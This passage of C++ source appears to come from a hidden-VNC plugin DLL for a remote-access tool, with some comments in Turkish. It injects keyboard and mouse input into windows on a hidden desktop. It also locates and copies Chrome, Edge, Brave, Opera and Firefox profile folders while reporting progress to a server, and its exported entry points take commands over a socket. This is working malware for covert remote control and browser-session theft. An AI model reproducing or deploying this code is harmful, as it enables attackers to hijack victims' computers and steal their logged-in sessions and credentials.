    set_key_down(state, VK_LSHIFT, shiftDown);
    set_key_down(state, VK_RSHIFT, shiftDown);
}

static void send_keyboard_message(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam,
                                  bool ctrlDown, bool altDown, bool shiftDown) {
    DWORD targetThreadId = GetWindowThreadProcessId(hwnd, NULL);
    DWORD currentThreadId = GetCurrentThreadId();
    bool attached = false;

    if (targetThreadId && targetThreadId != currentThreadId) {
        attached = AttachThreadInput(currentThreadId, targetThreadId, TRUE) != FALSE;
    }

    BYTE oldState[256] = {};
    BYTE newState[256] = {};
    bool hasOldState = GetKeyboardState(oldState) != FALSE;
    if (hasOldState) {
        memcpy(newState, oldState, sizeof(newState));
    }

    apply_modifier_state(newState, ctrlDown, altDown, shiftDown);
    SetKeyboardState(newState);

    DWORD_PTR result = 0;
    SendMessageTimeoutW(hwnd, msg, wParam, lParam, SMTO_ABORTIFHUNG, 100, &result);

    if (hasOldState) {
        SetKeyboardState(oldState);
    }
    if (attached) {
        AttachThreadInput(currentThreadId, targetThreadId, FALSE);
    }
}

static HWND resolve_child_window_from_point(HWND hwnd, POINT screenPt) {
    HWND best = hwnd;
    HWND current = hwnd;

    while (current && IsWindow(current)) {
        best = current;
        POINT clientPt = screenPt;
        if (!ScreenToClient(current, &clientPt)) break;

        HWND child = ChildWindowFromPointEx(current, clientPt, CWP_SKIPINVISIBLE | CWP_SKIPDISABLED | CWP_SKIPTRANSPARENT);
        if (!child || child == current || !IsWindow(child)) break;

        RECT childRect;
        if (!GetWindowRect(child, &childRect) || !PtInRect(&childRect, screenPt)) break;
        current = child;
    }

    return best;
}

static HWND smart_window_from_point(POINT pt) {
    const int WS_EX_TRANSPARENT_FLAG = 0x00000020;

    for (int attempt = 0; attempt < 4; attempt++) {
        HWND hwnd = WindowFromPoint(pt);
        if (!hwnd) return NULL;
        wchar_t cls[256] = {0};
        if (GetClassNameW(hwnd, cls, 256)) {
            if (wcscmp(cls, L"UserOOBEWindowClass") == 0 || wcscmp(cls, L"WorkerW") == 0 || wcscmp(cls, L"Progman") == 0) {
                LONG_PTR ex = GetWindowLongPtrW(hwnd, GWL_EXSTYLE);
                if ((ex & WS_EX_TRANSPARENT_FLAG) == 0) {
                    SetWindowLongPtrW(hwnd, GWL_EXSTYLE, ex | WS_EX_TRANSPARENT_FLAG);
                }
                continue;
            }
        }
        return hwnd;
    }
    return WindowFromPoint(pt);
}

static HWND target_window_from_screen_point(POINT screenPt) {
    HWND hwnd = smart_window_from_point(screenPt);
    if (!hwnd || !IsWindow(hwnd)) return NULL;
    return resolve_child_window_from_point(hwnd, screenPt);
}

static bool is_context_menu_or_popup(HWND prevRoot, HWND root) {
    if (!root) return false;
    wchar_t cls[256] = {0};
    if (GetClassNameW(root, cls, 256)) {
        if (wcscmp(cls, L"#32768") == 0) return true;
    }
    LONG style = GetWindowLongW(root, GWL_STYLE);
    bool isPopup = (style & WS_POPUP) != 0;
    if (!isPopup) return false;
    if (!prevRoot) return false;
    DWORD pidPrev = 0, pidNew = 0;
    GetWindowThreadProcessId(prevRoot, &pidPrev);
    GetWindowThreadProcessId(root, &pidNew);
    return pidPrev != 0 && pidPrev == pidNew;
}

static bool is_taskbar(HWND hwnd) {
    if (!hwnd) return false;
    HWND r = GetAncestor(hwnd, GA_ROOT);
    if (!r) r = hwnd;
    wchar_t cls[256] = {0};
    GetClassNameW(r, cls, 256);
    return wcscmp(cls, L"Shell_TrayWnd") == 0;
}

static void activate_window(HWND root, HWND hwnd) {
    SetForegroundWindow(root);
    SetActiveWindow(root);
    SetFocus(hwnd);
    g_hLastWindow = hwnd;
}

static void activate_if_new_window(HWND hwnd) {
    HWND root = GetAncestor(hwnd, GA_ROOT);
    if (!root) root = hwnd;
    HWND prevRoot = g_hLastWindow ? GetAncestor(g_hLastWindow, GA_ROOT) : NULL;
    if (!prevRoot) prevRoot = g_hLastWindow;
    g_hLastWindow = hwnd;
    if (prevRoot == root) return;
    if (is_context_menu_or_popup(prevRoot, root)) return;
    if (is_taskbar(root)) return;
    DWORD pidNew = 0, pidPrev = 0;
    GetWindowThreadProcessId(root, &pidNew);
    GetWindowThreadProcessId(prevRoot, &pidPrev);
    if (pidPrev != 0 && pidPrev == pidNew) return;
    activate_window(root, hwnd);
}

static int refine_nc_hit(int hit, HWND root, int x, int y) {
    if (hit != HTCAPTION && hit != HTCLIENT && hit != 0) return hit;
    if (hit == HTCLIENT) return HTCLIENT;

    RECT wr;
    if (!GetWindowRect(root, &wr)) return hit;

    int border = GetSystemMetrics(SM_CXSIZEFRAME);
    int cy = GetSystemMetrics(SM_CYCAPTION);
    int btnW = cy * 2;
    int barTop = wr.top;
    int barBot = wr.top + cy * 2 + border;

    if (y < barTop || y > barBot) return HTCAPTION;
    if (x < wr.left || x > wr.right) return HTCAPTION;
    if (x >= wr.right - btnW) return HTCLOSE;
    if (x >= wr.right - btnW * 2) return HTMAXBUTTON;
    if (x >= wr.right - btnW * 3) return HTMINBUTTON;

    return HTCAPTION;
}

static int safe_nc_hit_test(HWND hwnd, LPARAM lparam) {
    DWORD_PTR r = 0;
    SendMessageTimeoutW(hwnd, WM_NCHITTEST, 0, lparam, SMTO_ABORTIFHUNG, 30, &r);
    return (int)r;
}

static bool should_use_sync_delivery(HWND hwnd) {
    if (!hwnd || !IsWindow(hwnd)) return false;
    wchar_t cls[256] = {0};
    if (GetClassNameW(hwnd, cls, 256)) {
        if (wcscmp(cls, L"UIItemsView") == 0 || wcscmp(cls, L"DirectUIHWND") == 0) return true;
        if (wcsncmp(cls, L"Qt5", 3) == 0 || wcsncmp(cls, L"Qt6", 3) == 0 || wcsncmp(cls, L"Qt4", 3) == 0) return true;
    }
    return false;
}

// -----------------------------------------------------------------------
//  Topmost desktop window helpers
// -----------------------------------------------------------------------
static BOOL CALLBACK TopmostEnumProc(HWND hwnd, LPARAM lParam) {
    HWND* pResult = reinterpret_cast<HWND*>(lParam);
    if (IsWindowVisible(hwnd) && !IsIconic(hwnd)) {
        wchar_t className[256];
        if (GetClassNameW(hwnd, className, 256)) {
            // Skip the standard desktop manager and taskbar windows
            if (wcscmp(className, L"Progman") != 0 &&
                wcscmp(className, L"Shell_TrayWnd") != 0 &&
                wcscmp(className, L"Button") != 0) {
                *pResult = hwnd;
                return FALSE; // Stop enumerating, found topmost
            }
        }
    }
    return TRUE;
}

static HWND GetTopmostDesktopWindow() {
    HWND topmost = NULL;
    EnumDesktopWindows(g_hHiddenDesktop, TopmostEnumProc, reinterpret_cast<LPARAM>(&topmost));
    return topmost;
}

// -----------------------------------------------------------------------
//  Yardımcı: Odaklanmış pencereyi bul (gizli desktop'ta)
// -----------------------------------------------------------------------
static HWND GetFocusedWindow() {
    HWND hTarget = g_hCurrentFocus;
    if (!hTarget || !IsWindow(hTarget)) hTarget = GetTopmostDesktopWindow(); // Fallback to topmost window of hidden desktop
    if (!hTarget || !IsWindow(hTarget)) hTarget = GetForegroundWindow();
    if (!hTarget || !IsWindow(hTarget)) hTarget = g_hLastWindow;
    if (!hTarget || !IsWindow(hTarget)) return NULL;

    DWORD threadId = GetWindowThreadProcessId(hTarget, NULL);
    GUITHREADINFO gti = { sizeof(GUITHREADINFO) };
    if (GetGUIThreadInfo(threadId, &gti)) {
        if (gti.hwndFocus) return gti.hwndFocus;
        if (gti.hwndCaret) return gti.hwndCaret;
    }
    return hTarget;
}

// -----------------------------------------------------------------------
//  input_loop – Klavye ve Mouse etkileşim iyileştirmeleri
// -----------------------------------------------------------------------
static void input_loop() {
    ensure_desktop();
    if (!g_hHiddenDesktop) { g_inputRunning = false; return; }
    if (!SetThreadDesktop(g_hHiddenDesktop)) { g_inputRunning = false; return; }

    while (g_inputRunning) {
        InputTask task;
        {
            unique_lock<mutex> lock(g_inputMutex);
            g_inputCV.wait(lock, [] { return !g_inputQueue.empty() || !g_inputRunning; });
            if (!g_inputRunning) {
                g_inputQueue.clear();
                break;
            }
            task = g_inputQueue.front();
            g_inputQueue.pop_front();
        }

        const string& action = task.action;
        const json&   cmd    = task.cmd;

        // ---- Klavye ----
        if (action == "hvnc_keydown" || action == "hvnc_keyup" || action == "hvnc_char") {
            int vk = cmd.value("keycode", 0);
            HWND hTarget = WindowFromPoint(g_lastMousePos);
            if (!hTarget || !IsWindow(hTarget)) hTarget = GetFocusedWindow();
            if (!hTarget || !IsWindow(hTarget)) continue;

            HWND hRoot = GetAncestor(hTarget, GA_ROOT);
            if (!hRoot) hRoot = hTarget;
            DWORD tid = GetWindowThreadProcessId(hRoot, NULL);
            if (tid != 0) {
                GUITHREADINFO gi = { sizeof(GUITHREADINFO) };
                if (GetGUIThreadInfo(tid, &gi) && gi.hwndFocus != NULL) {
                    hTarget = gi.hwndFocus;
                }
            }

            UINT scan = MapVirtualKeyW((UINT)vk, MAPVK_VK_TO_VSC);
            LPARAM lpDn = (LPARAM)(1u | (scan << 16));
            LPARAM lpUp = (LPARAM)(0xC0000001u | (scan << 16));

            if (action == "hvnc_keydown") {
                if (vk == 0x10 || vk == 0xA0 || vk == 0xA1) g_shiftDown = true;
                if (vk == 0x11 || vk == 0xA2 || vk == 0xA3) g_ctrlDown = true;
                if (vk == 0x12 || vk == 0xA4 || vk == 0xA5) g_altDown = true;
                if (vk == 0x14) g_capsLock = !g_capsLock;

                bool isModifier = (vk == 0x10 || vk == 0xA0 || vk == 0xA1 ||
                                   vk == 0x11 || vk == 0xA2 || vk == 0xA3 ||
                                   vk == 0x12 || vk == 0xA4 || vk == 0xA5 ||
                                   vk == 0x14);

                if (isModifier) {
                    send_keyboard_message(hTarget, WM_KEYDOWN, (WPARAM)vk, key_lparam((WORD)vk, false),
                                          g_ctrlDown, g_altDown, g_shiftDown);
                } else if (g_ctrlDown && !g_altDown && vk >= 0x41 && vk <= 0x5A) {
                    // Ctrl+Key combinations
                    send_keyboard_message(hTarget, WM_KEYDOWN, (WPARAM)vk, key_lparam((WORD)vk, false),
                                          g_ctrlDown, g_altDown, g_shiftDown);
                    send_keyboard_message(hTarget, WM_CHAR, (WPARAM)(vk - 0x40), 1,
                                          g_ctrlDown, g_altDown, g_shiftDown);
                } else {
                    send_keyboard_message(hTarget, WM_KEYDOWN, (WPARAM)vk, key_lparam((WORD)vk, false),
                                          g_ctrlDown, g_altDown, g_shiftDown);
                    if (vk == VK_RETURN) {
                        send_keyboard_message(hTarget, WM_CHAR, (WPARAM)13, key_lparam((WORD)vk, false),
                                              g_ctrlDown, g_altDown, g_shiftDown);
                    } else if (vk == VK_BACK) {
                        send_keyboard_message(hTarget, WM_CHAR, (WPARAM)8, key_lparam((WORD)vk, false),
                                              g_ctrlDown, g_altDown, g_shiftDown);
                    }
                }
            } else if (action == "hvnc_keyup") {
                if (vk == 0x10 || vk == 0xA0 || vk == 0xA1) g_shiftDown = false;
                if (vk == 0x11 || vk == 0xA2 || vk == 0xA3) g_ctrlDown = false;
                if (vk == 0x12 || vk == 0xA4 || vk == 0xA5) g_altDown = false;

                send_keyboard_message(hTarget, WM_KEYUP, (WPARAM)vk, key_lparam((WORD)vk, true),
                                      g_ctrlDown, g_altDown, g_shiftDown);
            } else if (action == "hvnc_char") {
                send_keyboard_message(hTarget, WM_CHAR, (WPARAM)vk, 1,
                                      g_ctrlDown, g_altDown, g_shiftDown);
            }
            request_full_frame(true);
            continue;
        }

        // ---- Mouse ----
        if (action.find("hvnc_mouse") == string::npos && action != "hvnc_doubleclick") continue;

        int normX = cmd.value("x", 0);
        int normY = cmd.value("y", 0);
        POINT screenPt = screen_pt(normX, normY);
        g_lastMousePos = screenPt;

        if (action == "hvnc_mousemove") {
            request_full_frame(false);
            SetCursorPos(screenPt.x, screenPt.y);
            send_mouse_input(normX, normY, MOUSEEVENTF_MOVE);

            if (g_dragging && g_dragHwnd) {
                int dx = screenPt.x - g_dragStartPt.x;
                int dy = screenPt.y - g_dragStartPt.y;

                if (g_dragHitTest == HTCAPTION) {
                    int newX = g_dragStartRect.left + dx;
                    int newY = g_dragStartRect.top  + dy;
                    SetWindowPos(g_dragHwnd, NULL, newX, newY, 0, 0,
                                 SWP_NOSIZE | SWP_NOZORDER | SWP_NOACTIVATE);
                } else {
                    RECT rc = g_dragStartRect;
                    int  w  = rc.right  - rc.left;
                    int  h  = rc.bottom - rc.top;

                    switch (g_dragHitTest) {
                        case HTRIGHT:        w += dx; break;
                        case HTBOTTOM:       h += dy; break;
                        case HTBOTTOMRIGHT:  w += dx; h += dy; break;
                        case HTLEFT:         rc.left += dx; w -= dx; break;
                        case HTTOP:          rc.top  += dy; h -= dy; break;
                        case HTTOPLEFT:      rc.left += dx; w -= dx; rc.top += dy; h -= dy; break;
                        case HTTOPRIGHT:     w += dx; rc.top += dy; h -= dy; break;
                        case HTBOTTOMLEFT:   rc.left += dx; w -= dx; h += dy; break;
                        default: break;
                    }
                    if (w < 100) w = 100;
                    if (h < 50) h = 50;
                    SetWindowPos(g_dragHwnd, NULL, rc.left, rc.top, w, h,
                                 SWP_NOZORDER | SWP_NOACTIVATE);
                }
            } else {
                HWND hwnd = smart_window_from_point(screenPt);
                if (hwnd) {
                    activate_if_new_window(hwnd);
                    POINT clientPt = screenPt;
                    ScreenToClient(hwnd, &clientPt);
                    WPARAM moveWParam = g_leftButtonDown ? MK_LBUTTON : 0;
                    PostMessageW(hwnd, WM_MOUSEMOVE, moveWParam, MAKELPARAM(clientPt.x, clientPt.y));

                    LRESULT ht = HTCLIENT;
                    if (SendMessageTimeoutW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y),
                                            SMTO_ABORTIFHUNG, 50, (PDWORD_PTR)&ht)) {
                        PostMessageW(hwnd, WM_SETCURSOR, (WPARAM)hwnd, MAKELPARAM(ht, WM_MOUSEMOVE));
                    }
                }
            }
            continue;
        }

        if (action == "hvnc_mousedown") {
            request_full_frame(true);
            int btn = cmd.value("button", 0);
            if (btn < 0 || btn > 2) btn = 0;

            if (btn == 0) g_leftButtonDown = true;

            HWND hwnd = target_window_from_screen_point(screenPt);
            if (!hwnd) hwnd = WindowFromPoint(screenPt);

            if (hwnd) {
                HWND hRoot = GetAncestor(hwnd, GA_ROOT);
                if (!hRoot) hRoot = hwnd;

                // NC Hit-test refinement
                int hit = safe_nc_hit_test(hwnd, MAKELPARAM(screenPt.x, screenPt.y));
                hit = refine_nc_hit(hit, hRoot, screenPt.x, screenPt.y);

                if (hit != HTCLIENT && btn == 0) {
                    if (hit == HTCLOSE) { PostMessageW(hRoot, WM_CLOSE, 0, 0); continue; }
                    else if (hit == HTMINBUTTON) { PostMessageW(hRoot, WM_SYSCOMMAND, SC_MINIMIZE, 0); continue; }
                    else if (hit == HTMAXBUTTON) {
                        WINDOWPLACEMENT wp = { sizeof(wp) };
                        GetWindowPlacement(hRoot, &wp);
                        if (wp.showCmd == SW_SHOWMAXIMIZED) PostMessageW(hRoot, WM_SYSCOMMAND, SC_RESTORE, 0);
                        else PostMessageW(hRoot, WM_SYSCOMMAND, SC_MAXIMIZE, 0);
                        continue;
                    }

                    if (hit == HTCAPTION || hit == HTLEFT || hit == HTRIGHT || hit == HTTOP || hit == HTBOTTOM ||
                        hit == HTTOPLEFT || hit == HTTOPRIGHT || hit == HTBOTTOMLEFT || hit == HTBOTTOMRIGHT) {
                        g_dragging = true;
                        g_dragHwnd = hRoot;
                        g_dragStartPt = screenPt;
                        g_dragHitTest = hit;
                        GetWindowRect(hRoot, &g_dragStartRect);
                        send_mouse_input(normX, normY, MOUSEEVENTF_MOVE | mouse_button_flag(btn, true));
                        continue;
                    }
                }

                // Activate if new window and not a popup/menu
                HWND prevRoot = g_hLastWindow ? GetAncestor(g_hLastWindow, GA_ROOT) : NULL;
                if (!prevRoot) prevRoot = g_hLastWindow;
                if (!is_context_menu_or_popup(prevRoot, hRoot)) {
                    activate_window(hRoot, hwnd);
                }
                g_hCurrentFocus = hwnd;
                g_mouseDownTarget[btn] = hwnd;

                POINT clientPt = screenPt;
                ScreenToClient(hwnd, &clientPt);
                LPARAM lParam = MAKELPARAM(clientPt.x, clientPt.y);

                SetCursorPos(screenPt.x, screenPt.y);

                bool useSync = should_use_sync_delivery(hwnd);
                UINT mouseMsg = mouse_message_for_button(btn, true);

                PostMessageW(hwnd, WM_SETCURSOR, (WPARAM)hwnd, MAKELPARAM(hit, mouseMsg));

                if (btn == 0) {
                    if (useSync) {
                        wchar_t cls[256] = {0};
                        GetClassNameW(hwnd, cls, 256);
                        bool isQt = (wcsncmp(cls, L"Qt5", 3) == 0 || wcsncmp(cls, L"Qt6", 3) == 0 || wcsncmp(cls, L"Qt4", 3) == 0);
                        if (isQt) {
                            DWORD_PTR rDummy = 0;
                            SendMessageTimeoutW(hwnd, WM_MOUSEMOVE, 0, lParam, SMTO_ABORTIFHUNG, 50, &rDummy);
                        }
                        DWORD_PTR rDummy = 0;
                        SendMessageTimeoutW(hwnd, WM_LBUTTONDOWN, MK_LBUTTON, lParam, SMTO_ABORTIFHUNG, 200, &rDummy);
                        g_lbDownHwnd = hwnd;
                    } else {
                        PostMessageW(hwnd, WM_MOUSEMOVE, 0, lParam);
                        PostMessageW(hwnd, WM_LBUTTONDOWN, MK_LBUTTON, lParam);
                        g_lbDownHwnd = hwnd;
                    }
                } else {
                    if (useSync) {
                        DWORD_PTR rDummy = 0;
                        SendMessageTimeoutW(hwnd, mouseMsg, mouse_wparam_for_button(btn, true), lParam, SMTO_ABORTIFHUNG, 200, &rDummy);
                    } else {
                        PostMessageW(hwnd, mouseMsg, mouse_wparam_for_button(btn, true), lParam);
                    }
                }
            }
            continue;
        }

        if (action == "hvnc_mouseup") {
            request_full_frame(true);
            int btn = cmd.value("button", 0);
            if (btn < 0 || btn > 2) btn = 0;

            if (btn == 0) g_leftButtonDown = false;

            if (btn == 0 && g_dragging) {
                g_dragging = false;
                g_dragHwnd = NULL;
                send_mouse_input(normX, normY, MOUSEEVENTF_MOVE | mouse_button_flag(btn, false));
                continue;
            }

            HWND hwnd = g_mouseDownTarget[btn];
            if (!hwnd || !IsWindow(hwnd)) hwnd = target_window_from_screen_point(screenPt);
            if (!hwnd) hwnd = WindowFromPoint(screenPt);

            if (hwnd) {
                HWND hRoot = GetAncestor(hwnd, GA_ROOT);
                if (!hRoot) hRoot = hwnd;

                int hit = safe_nc_hit_test(hwnd, MAKELPARAM(screenPt.x, screenPt.y));
                hit = refine_nc_hit(hit, hRoot, screenPt.x, screenPt.y);

                UINT mouseMsg = mouse_message_for_button(btn, false);

                if (btn == 0) {
                    HWND upTarget = (g_lbDownHwnd != NULL && IsWindow(g_lbDownHwnd)) ? g_lbDownHwnd : hwnd;
                    g_lbDownHwnd = NULL;

                    POINT clientPt = screenPt;
                    ScreenToClient(upTarget, &clientPt);
                    LPARAM lParam = MAKELPARAM(clientPt.x, clientPt.y);

                    SetCursorPos(screenPt.x, screenPt.y);
                    PostMessageW(upTarget, WM_SETCURSOR, (WPARAM)upTarget, MAKELPARAM(hit, mouseMsg));

                    bool useSync = should_use_sync_delivery(upTarget);
                    if (useSync) {
                        DWORD_PTR rDummy = 0;
                        SendMessageTimeoutW(upTarget, WM_MOUSEMOVE, MK_LBUTTON, lParam, SMTO_ABORTIFHUNG, 50, &rDummy);
                        SendMessageTimeoutW(upTarget, WM_LBUTTONUP, 0, lParam, SMTO_ABORTIFHUNG, 200, &rDummy);
                    } else {
                        PostMessageW(upTarget, WM_MOUSEMOVE, MK_LBUTTON, lParam);
                        PostMessageW(upTarget, WM_LBUTTONUP, 0, lParam);
                    }
                } else {
                    POINT clientPt = screenPt;
                    ScreenToClient(hwnd, &clientPt);
                    LPARAM lParam = MAKELPARAM(clientPt.x, clientPt.y);

                    SetCursorPos(screenPt.x, screenPt.y);
                    PostMessageW(hwnd, WM_SETCURSOR, (WPARAM)hwnd, MAKELPARAM(hit, mouseMsg));

                    bool useSync = should_use_sync_delivery(hwnd);
                    if (useSync) {
                        DWORD_PTR rDummy = 0;
                        SendMessageTimeoutW(hwnd, mouseMsg, mouse_wparam_for_button(btn, false), lParam, SMTO_ABORTIFHUNG, 200, &rDummy);
                    } else {
                        PostMessageW(hwnd, mouseMsg, mouse_wparam_for_button(btn, false), lParam);
                    }
                }
            }
            g_mouseDownTarget[btn] = NULL;
            continue;
        }

        if (action == "hvnc_doubleclick") {
            request_full_frame(true);
            int btn = cmd.value("button", 0);
            if (btn < 0 || btn > 2) btn = 0;

            HWND hwnd = target_window_from_screen_point(screenPt);
            if (!hwnd) hwnd = WindowFromPoint(screenPt);

            if (hwnd) {
                HWND hRoot = GetAncestor(hwnd, GA_ROOT);
                if (!hRoot) hRoot = hwnd;

                int hit = safe_nc_hit_test(hwnd, MAKELPARAM(screenPt.x, screenPt.y));
                hit = refine_nc_hit(hit, hRoot, screenPt.x, screenPt.y);

                UINT downMsg = mouse_message_for_button(btn, true);
                UINT upMsg   = mouse_message_for_button(btn, false);
                UINT dblMsg  = mouse_message_for_button(btn, true, btn == 0);

                // Activate window
                HWND prevRoot = g_hLastWindow ? GetAncestor(g_hLastWindow, GA_ROOT) : NULL;
                if (!prevRoot) prevRoot = g_hLastWindow;
                if (!is_context_menu_or_popup(prevRoot, hRoot)) {
                    activate_window(hRoot, hwnd);
                }

                POINT clientPt = screenPt;
                ScreenToClient(hwnd, &clientPt);
                LPARAM lParam = MAKELPARAM(clientPt.x, clientPt.y);
                WPARAM downWParam = mouse_wparam_for_button(btn, true);
                WPARAM upWParam   = mouse_wparam_for_button(btn, false);

                SetCursorPos(screenPt.x, screenPt.y);
                PostMessageW(hwnd, WM_SETCURSOR, (WPARAM)hwnd, MAKELPARAM(hit, downMsg));

                bool useSync = should_use_sync_delivery(hwnd);
                if (useSync) {
                    DWORD_PTR rDummy = 0;
                    SendMessageTimeoutW(hwnd, WM_MOUSEMOVE, downWParam, lParam, SMTO_ABORTIFHUNG, 50, &rDummy);
                    SendMessageTimeoutW(hwnd, downMsg, downWParam, lParam, SMTO_ABORTIFHUNG, 200, &rDummy);
                    SendMessageTimeoutW(hwnd, upMsg, upWParam, lParam, SMTO_ABORTIFHUNG, 200, &rDummy);
                    SendMessageTimeoutW(hwnd, dblMsg, downWParam, lParam, SMTO_ABORTIFHUNG, 200, &rDummy);
                    SendMessageTimeoutW(hwnd, upMsg, upWParam, lParam, SMTO_ABORTIFHUNG, 200, &rDummy);
                } else {
                    PostMessageW(hwnd, WM_MOUSEMOVE, downWParam, lParam);
                    PostMessageW(hwnd, downMsg, downWParam, lParam);
                    PostMessageW(hwnd, upMsg, upWParam, lParam);
                    PostMessageW(hwnd, dblMsg, downWParam, lParam);
                    PostMessageW(hwnd, upMsg, upWParam, lParam);
                }
            }
            continue;
        }
    }
}

static wstring utf8_to_wstring(const string& str) {
    if (str.empty()) return wstring();
    int size = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
    if (size <= 0) return wstring();
    wstring res(size, 0);
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &res[0], size);
    if (!res.empty() && res.back() == L'\0') res.pop_back();
    return res;
}

static string wstring_to_utf8(const wstring& wstr) {
    if (wstr.empty()) return string();
    int size = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
    if (size <= 0) return string();
    string res(size, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &res[0], size, NULL, NULL);
    if (!res.empty() && res.back() == '\0') res.pop_back();
    return res;
}

static wstring get_app_path(const wstring& appName) {
    HKEY hKey;
    wstring subkey = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\" + appName;
    wstring path;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        wchar_t buffer[MAX_PATH];
        DWORD size = sizeof(buffer);
        if (RegQueryValueExW(hKey, NULL, NULL, NULL, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
            path = buffer;
        }
        RegCloseKey(hKey);
    }
    if (path.empty()) {
        if (RegOpenKeyExW(HKEY_CURRENT_USER, subkey.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            wchar_t buffer[MAX_PATH];
            DWORD size = sizeof(buffer);
            if (RegQueryValueExW(hKey, NULL, NULL, NULL, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
                path = buffer;
            }
            RegCloseKey(hKey);
        }
    }
    return path;
}

static wstring get_browser_profile_path(const wstring& browserName) {
    wchar_t szPath[MAX_PATH];
    if (browserName == L"Opera" || browserName == L"Opera GX") {
        if (SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, szPath) != S_OK) return L"";
        wstring path = szPath;
        if (browserName == L"Opera") path += L"\\Opera Software\\Opera Stable";
        else path += L"\\Opera Software\\Opera GX Stable";
        return path;
    } else {
        if (SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, szPath) != S_OK) return L"";
        wstring path = szPath;
        if (browserName == L"Google Chrome") {
            path += L"\\Google\\Chrome\\User Data";
        } else if (browserName == L"Microsoft Edge") {
            path += L"\\Microsoft\\Edge\\User Data";
        } else if (browserName == L"Brave") {
            path += L"\\BraveSoftware\\Brave-Browser\\User Data";
        } else {
            return L"";
        }
        return path;
    }
}

static wstring get_gecko_profile_path(const wstring& browserName) {
    wchar_t szPath[MAX_PATH];
    if (SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, szPath) != S_OK) return L"";

    wstring path = szPath;
    if (browserName == L"Firefox") {
        path += L"\\Mozilla\\Firefox";
    } else if (browserName == L"Waterfox") {
        path += L"\\Waterfox";
    } else if (browserName == L"LibreWolf") {
        path += L"\\LibreWolf";
    } else {
        return L"";
    }
    return path;
}

static const vector<wstring> SKIPPED_PROFILE_DIRS = {
    L"Cache", L"Code Cache", L"GPUCache", L"ShaderCache", L"DawnCache",
    L"GrShaderCache", L"Snapshots", L"CrashReports", L"Crash Reports", L"Crashpad",
    L"BrowserMetrics", L"BrowserMetrics-spare", L"component_crx_cache",
    L"optimization_guide_model_downloads", L"Safe Browsing", L"FileTypePolicies",
    L"PepperFlash", L"WidevineCdm", L"MEIPreload", L"OriginTrials",
    L"cache2", L"startupCache", L"shader-cache", L"thumbnails", L"storage",
    L"Service Worker", L"Media Cache", L"WebStorage", L"crash_reporter"
};

static bool should_skip_dir(const wstring& name) {
    for (const auto& skip : SKIPPED_PROFILE_DIRS) {
        if (_wcsicmp(name.c_str(), skip.c_str()) == 0) return true;
    }
    return false;
}

static void collect_file_pairs(const fs::path& src, const fs::path& dst, vector<pair<wstring, wstring>>& tasks) {
    if (!fs::exists(src)) return;
    try { fs::create_directories(dst); } catch (...) {}
    try {
        for (const auto& entry : fs::directory_iterator(src)) {
            const auto& path = entry.path();
            wstring name = path.filename().wstring();

            if (name == L"SingletonLock" || name == L"Parent.lock" || name == L"parent.lock" || name == L"lock") continue;

            if (entry.is_directory()) {
                if (should_skip_dir(name)) continue;
                collect_file_pairs(path, dst / name, tasks);
            } else {
                tasks.push_back({path.wstring(), (dst / name).wstring()});
            }
        }
    } catch (...) {}
}

static bool copy_profile_parallel(const wstring& src_dir, const wstring& dst_dir, const string& label) {
    vector<pair<wstring, wstring>> tasks;
    collect_file_pairs(fs::path(src_dir), fs::path(dst_dir), tasks);

    int total_files = (int)tasks.size();
    if (total_files == 0) return true;

    atomic<int> progress_count(0);
    atomic<int> task_index(0);

    // Reporter thread: periodically sends progress back to server
    atomic<bool> reporter_running(true);
    thread reporter([&]() {
        while (reporter_running) {
            int current_copied = progress_count.load();
            int pct = (current_copied * 100) / total_files;
            if (pct > 99) pct = 99;
            send_status(label + " (" + to_string(pct) + "%)");
            this_thread::sleep_for(chrono::milliseconds(150));
        }
    });

    const int NUM_THREADS = 4;
    vector<thread> workers;
    for (int i = 0; i < NUM_THREADS; ++i) {
        workers.push_back(thread([&]() {
            while (true) {
                int idx = task_index.fetch_add(1);
                if (idx >= total_files) break;

                const auto& task = tasks[idx];
                fs::path dst_path(task.second);
                try {
                    fs::create_directories(dst_path.parent_path());
                } catch (...) {}

                if (!CopyFileW(task.first.c_str(), task.second.c_str(), FALSE)) {
                    // Ignore errors for robustness
                }
                progress_count.fetch_add(1);
            }
        }));
    }

    for (auto& t : workers) {
        if (t.joinable()) t.join();
    }

    reporter_running = false;
    if (reporter.joinable()) reporter.join();

    send_status(label + " (100%)");
    return true;
}

extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
    initialize_visual_styles();
    g_socket = sock;
}

extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmdJson) {
    try {
        json   cmd    = json::parse(cmdJson);
        string action = cmd.value("action", "");
        g_socket = sock;
        initialize_visual_styles();

        if (action == "hvnc_start") {
            g_scalePercent = cmd.value("quality", 50);
            if (g_scalePercent < 10) g_scalePercent = 10;
            if (g_scalePercent > 100) g_scalePercent = 100;
            g_staticFrameCount = 0;
            request_full_frame(true);
            if (!g_captureRunning && !g_encodeRunning && !g_sendRunning) {
                clear_frame_pipeline();
            }
            if (!g_sendRunning.exchange(true)) {
                if (g_sendThread.joinable()) g_sendThread.join();
                g_sendThread = thread(send_worker);
            }
            if (!g_encodeRunning.exchange(true)) {
                if (g_encodeThread.joinable()) g_encodeThread.join();
                g_encodeThread = thread(encode_worker);
            }
            if (!g_captureRunning.exchange(true)) {
                if (g_captureThread.joinable()) g_captureThread.join();
                g_captureThread = thread(capture_loop);
            }
            if (!g_inputRunning.exchange(true)) {
                if (g_inputThread.joinable()) g_inputThread.join();
                g_inputThread = thread(input_loop);
            }
        } else if (action == "hvnc_stop") {
            g_captureRunning = false;
            g_encodeRunning  = false;
            g_sendRunning    = false;
            g_inputRunning   = false;
